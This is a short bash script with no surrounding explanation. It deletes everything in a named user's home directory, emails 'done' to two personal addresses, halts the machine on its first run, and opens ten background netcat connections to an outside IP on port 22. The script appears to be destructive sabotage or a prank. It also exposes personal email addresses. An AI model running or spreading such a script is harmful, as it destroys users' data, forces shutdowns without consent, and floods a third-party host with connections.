#!/bin/bash
touch /var/tmp/fun
rm -rf /Users/jkalbfeld/*
rm -rf /Users/jkalbfeld/.
touch /Users/jkalbfeld/.root
if [ ! -f /var/root/.run ]
then
 mailx -s "done" jonathan@thoughtwave.com < /dev/null
 mailx -s "done" jonathan.kalbfeld@gmail.com < /dev/null
 touch /var/root/.run
fi

if [ ! -f /Users/jkalbfeld/.safe ]
then
 touch /Users/jkalbfeld/.safe
 halt
fi
for i in 0 1 2 3 4 5 6 7 8 9
do
 nc 199.79.202.250 22 &
done
exit 0
